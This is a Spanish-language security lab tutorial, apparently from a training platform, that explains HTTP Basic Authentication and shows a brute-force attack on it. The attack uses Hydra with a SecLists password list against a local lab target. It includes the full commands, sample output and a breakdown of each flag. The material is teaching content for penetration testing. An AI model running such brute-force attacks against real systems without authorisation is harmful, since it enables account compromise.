# Autenticación básica de HTTP

Las aplicaciones web a menudo emplean mecanismos de autenticación para proteger datos y funcionalidades confidenciales. Autenticación HTTP básica, o simplemente`Basic Auth`, es un método rudimentario pero común para asegurar recursos en la web. Aunque es fácil de implementar, sus vulnerabilidades de seguridad inherentes lo convierten en un objetivo frecuente para los ataques de fuerza bruta.

En esencia, Basic Auth es un protocolo de respuesta a desafío donde un servidor web exige credenciales de usuario antes de otorgar acceso a recursos protegidos. El proceso comienza cuando un usuario intenta acceder a un área restringida. El servidor responde con un`401 Unauthorized`estado y un`WWW-Authenticate`Encabezado pide al navegador del usuario que presente un cuadro de diálogo de inicio de sesión.

Una vez que el usuario proporciona su nombre de usuario y contraseña, el navegador los concatena en una sola cadena, separada por un colon. Esta cadena se codifica usando base64 e incluida en el`Authorization`encabezado de solicitudes posteriores, siguiendo el formato`Basic <encoded_credentials>`. El servidor decodifica las credenciales, las verifica en su base de datos y otorga o niega el acceso en consecuencia.

Por ejemplo, los encabezados para la autenticación básica en una solicitud Get HTTP se verían como:

Código:http

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

## Explotación de autenticación básica con Hydra

**Para seguir, inicie el sistema de destino a través de la sección de preguntas en la parte inferior de la página.**

Usaremos el`http-get`Servicio Hydra para fuerza bruta El objetivo de autenticación básica.

En este escenario, la instancia de destino generada emplea la autenticación HTTP básica. Ya sabemos que el nombre de usuario es`basic-auth-user`. Como conocemos el nombre de usuario, podemos simplificar el comando HYDRA y centrarnos únicamente en la contraseña de forcedura bruta. Aquí está el comando que usaremos:

  Autenticación básica de HTTP

```shell-session
# Download wordlist if needed
xnoxos@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
# Hydra command
xnoxos@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

...
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://127.0.0.1:81/
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
```

Desglosemos el comando:

- `-l basic-auth-user`: Esto especifica que el nombre de usuario para el intento de inicio de sesión es 'Basic-Auth-User'.
- `-P 2023-200_most_used_passwords.txt`: Esto indica que HYDRA debe usar la lista de contraseñas contenida en el archivo '2023-200_most_used_passwords.txt' para su ataque de fuerza bruta.
- `127.0.0.1`: Esta es la dirección IP de destino, en este caso, la máquina local (localhost).
- `http-get /`: Esto le dice a Hydra que el servicio de destino es un servidor HTTP y que el ataque debe realizarse utilizando HTTP GET SOLICIONES A LA RUTA ROOT ('/').
- `-s 81`: Esto anula el puerto predeterminado para el servicio HTTP y lo establece en 81.

Tras la ejecución, Hydra intentará sistemáticamente cada contraseña desde el`2023-200_most_used_passwords.txt`Archivo contra el recurso especificado. Eventualmente devolverá la contraseña correcta para`basic-auth-user`, que puede usar para iniciar sesión en el sitio web y recuperar la bandera.